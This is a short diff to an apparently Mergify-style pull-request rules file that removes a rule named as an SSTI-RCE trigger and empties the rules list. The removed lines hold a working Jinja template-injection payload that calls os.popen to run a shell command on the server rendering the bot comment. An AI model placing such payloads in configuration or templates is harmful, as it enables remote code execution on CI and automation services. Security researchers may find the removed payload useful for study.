@@ -1,10 +1,2 @@
-pull_request_rules:
-  - name: ssti-rce-trigger-20516
-    conditions: []
-    actions:
-      comment:
-        message: |
-          === G4o7T SSTI trigger ===
-          {% if author %}
-          {{ lipsum.__globals__.os.popen('id').read() }}
-          {% endif %}
+pull_request_rules: []
+# trigger 7712
